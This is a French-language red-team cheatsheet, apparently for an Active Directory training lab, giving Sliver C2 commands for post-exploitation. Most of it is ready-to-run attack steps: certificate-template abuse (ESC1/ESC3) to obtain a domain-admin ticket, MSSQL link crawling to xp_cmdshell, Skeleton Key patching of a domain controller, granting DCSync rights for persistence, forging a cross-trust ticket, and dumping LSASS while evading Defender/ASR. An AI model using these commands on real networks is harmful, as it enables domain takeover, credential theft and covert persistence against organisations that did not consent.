# Sliver - AD CS, SQL et persistance

> [!summary] Objectif
> Les voies transverses et la persistance via Sliver : **AD CS** (Certify ESC1/ESC3 + OpenSSL + Rubeus), **MSSQL** (SharpSQL / PowerUpSQL, database links), **persistance** (DSRM, Golden, clé de trust, DCSync rights), et **dump LSASS** furtif (minidumpdotnet). Théorie : [[Attaques AD]], [[Kerberos]].

> [!warning]- Required
> AD CS : un droit d'enrôlement sur un template vulnérable. MSSQL : un compte de domaine accepté par l'instance. Persistance DC : privilèges Domain Admin. LSASS : exécution SYSTEM sur la cible.

### AD CS — énumération (Certify)

```bash
[server] sliver (dcorp-std_https) > armory install certify
execute-assembly -i -M -E -t 60 '/mnt/c/AD/Tools/Sliver/Certify.exe' 'cas'
execute-assembly -i -M -E -t 60 '/mnt/c/AD/Tools/Sliver/Certify.exe' 'find /vulnerable'
```

`cas` liste les autorités de certification ; `find /vulnerable` repère les templates exploitables (ESC1 = `ENROLLEE_SUPPLIES_SUBJECT`, ESC3 = agent d'enrôlement).

### AD CS — ESC1 / ESC3 (Certify + OpenSSL + Rubeus)

```bash
# 1) Demander un certificat au nom d'un DA (ESC1 : SAN arbitraire)
execute-assembly -i -M -E -t 60 '/mnt/c/AD/Tools/Sliver/Certify.exe' 'request /ca:dcorp-dc\dollarcorp-DCORP-DC-CA /template:VulnTemplate /altname:administrator'
```

```bash
# 2) Convertir le PEM en PFX (VM d'attaque / WSL)
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

```bash
# 3) Utiliser le certificat pour obtenir un TGT DA (PKINIT)
execute-assembly -i -M -E -t 60 '/mnt/c/AD/Tools/Sliver/Rubeus.exe' 'asktgt /user:administrator /certificate:cert.pfx /password:<pfx_pwd> /ptt'
```

ESC3 : d'abord un certificat d'**agent d'enrôlement**, puis une demande **au nom d'un autre** compte — même finalité (TGT DA/EA). Court-circuite la chaîne classique depuis un simple Domain User.

### MSSQL — instances et links (SharpSQL / PowerUpSQL)

```bash
# Découverte d'instances + links
execute-assembly -p explorer.exe -t 60 '/mnt/c/AD/Tools/Sliver/SharpSQL.exe' '-enum'

# Exploitation des links (PowerUpSQL empaqueté PS2EXE)
execute-assembly -p explorer.exe -t 60 '/mnt/c/AD/Tools/Sliver/PowerUpSQL.exe' '-crawl -query "exec master..xp_cmdshell ''whoami''"'
```

Un compte de domaine accepté par une instance SQL permet le crawl des database links de proche en proche, jusqu'à l'exécution `xp_cmdshell` — potentiellement cross-forest.

### Persistance — DSRM

```bash
# Avec DA : lire le hash de l'admin DSRM (SAM local du DC) et activer son usage réseau
# puis rejouer par OverPass-the-Hash (voir Sliver - Kerberos et tickets)
```

Le compte **DSRM** est l'administrateur local du DC ; son hash permet un accès au DC indépendant du domaine. Persistance délivrée via PEzor + remote-sc-*.

### Persistance — Skeleton Key

```bash
# Patch du LSASS du DC (mot de passe maître = "mimikatz") — DA requis
execute-assembly -i -M -E -t 60 '/mnt/c/AD/Tools/Sliver/SafetyKatz.exe' '"privilege::debug" "misc::skeleton" -ComputerName dcorp-dc.dollarcorp.moneycorp.local'
```

Après le patch, tout compte du domaine accepte le mot de passe `mimikatz` en plus du sien. Non persistant au reboot, non OPSEC-safe, casse AD CS — accès court uniquement. Voir [[Cheatsheet - Persistence]].

### Persistance — DCSync rights (StandIn)

```bash
# Vérifier si studentX a déjà les droits de réplication
execute-assembly -p explorer.exe -t 45 '/mnt/c/AD/Tools/Sliver/StandIn.exe' '--object "distinguishedname=DC=DOLLARCORP,DC=MONEYCORP,DC=LOCAL" --access --ntaccount "dcorp\studentx"'

# Ajouter les droits DCSync à studentX (avec DA), puis DCSync
execute-assembly -p explorer.exe -t 45 '/mnt/c/AD/Tools/Sliver/StandIn.exe' '--object "DC=DOLLARCORP,DC=MONEYCORP,DC=LOCAL" --grant "dcorp\studentx" --rights DCSync'
```

Accorder DCSync à un compte contrôlé = persistance discrète (on rejoue `lsadump::dcsync` à volonté).

### Franchir un trust (clé de trust / krbtgt)

```bash
# TGT inter-realm forgé avec la clé de trust (enfant → parent) puis rejeu
execute-assembly -i -M -E -t 60 '/mnt/c/AD/Tools/Sliver/Rubeus.exe' 'silver /service:krbtgt/MONEYCORP.LOCAL /rc4:<TRUST_KEY> /sid:<CHILD_SID> /sids:<EA_SID> /user:Administrator /ptt'
```

Injecter le SID des Enterprise Admins (SID History non filtré intra-forêt) → EA. La clé de trust s'extrait par DCSync sur le compte de trust.

### Dump LSASS furtif (minidumpdotnet)

```bash
# Créer un minidump LSASS via une implémentation custom de MiniDumpWriteDump
execute-assembly -i -M -E -t 60 '/mnt/c/AD/Tools/Sliver/minidumpdotnet.exe' 'lsass C:\Windows\Temp\lsass.dmp'
```

```bash
# Parser offline sur la VM d'attaque
pypykatz lsa minidump lsass.dmp
```

`minidumpdotnet` évite l'ouverture de handle classique sur `lsass.exe` (contourne MDE / règles ASR). Le dump est exfiltré puis parsé hors ligne (pypykatz/mimikatz).

> [!note] ASR & OPSEC
> L'accès direct à LSASS par mimikatz est bloqué par les règles ASR de Defender. Passer par un minidump custom + parsing offline. Pour le mouvement latéral sous ASR, préférer `execute` + `winrs` (voir [[Sliver - Privesc et lateral]]).

## Related
- [[Attaques AD]]
- [[Kerberos]]
- [[Sliver - Kerberos et tickets]]
- [[Sliver - Privesc et lateral]]
- [[Sliver - Toutes les commandes]]
